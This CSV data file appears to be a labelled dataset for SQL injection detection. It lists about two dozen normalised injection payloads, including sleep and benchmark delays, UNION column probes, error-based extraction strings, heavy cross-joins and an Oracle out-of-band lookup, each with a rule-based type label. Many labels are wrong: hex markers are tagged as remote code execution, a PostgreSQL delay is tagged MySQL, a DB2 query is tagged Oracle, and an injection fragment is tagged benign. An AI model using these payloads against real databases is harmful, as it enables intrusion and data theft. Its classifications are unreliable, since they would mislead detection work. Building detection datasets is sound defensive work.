row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
1560,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ""%"" = """,1,,rce,generic,0.95,0x4c4d6142 detected — rce injection (priority 1) on generic,rule-based
1561,1 where 6223 = 6223 rlike sleep ( 5 ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1562,"1'|| ( select 'ymez' from dual where 9870 = 9870 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,,heavy_query,oracle,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on oracle",rule-based
1563,"1 ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( 5524 = 5524",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
1564,"1%"" ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ""%"" = """,1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
1565,-5962 ) ) as jbqv where 2583 = 2583 or 7496 = 8560--,1,,boolean_blind,generic,0.95,2583 = 2583 or detected — boolean_blind injection (priority 8) on generic,rule-based
1566,"-1244 ) as qszw where 2332 = 2332 union all select 2332,2332,2332,2332#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1567,"1%"" or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ""%"" = """,1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
1568,"1"" and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ""nzgn"" = ""nzgn",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
1569,( select ( case when ( 9856 = 9856 ) then sleep ( 5 ) else 9856* ( select 9856 from information_schema.character_sets ) end ) ),1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1570,"1"" ) ) as mlid where 1047 = 1047 union all select null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1571,"1%"" ) ) ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
1572,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( '%' = '",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
1573,-7532 ) ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( 8332 = 8332,1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
1574,"1"" ) ) union all select null,null,null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1575,"1"" ) where 1001 = 1001 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1,,rce,generic,0.95,0x4b774c75 detected — rce injection (priority 1) on generic,rule-based
1576,"1' ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( 'xwhi' = 'xwhi",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
1577,1' ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( 'prjf' = 'prjf,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
1578,1' ) as jdmh where 6175 = 6175 rlike sleep ( 5 ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1579,"1%"" ) ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
1580,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ""qwdi"" = ""qwdi",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
1581,1' in boolean mode ) union all select null--,1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1582,"-3071 ) ) as uiiu where 8910 = 8910 union all select 8910,8910,8910,8910,8910,8910,8910#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1583,"1"" ) ) as tgwp where 9405 = 9405",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
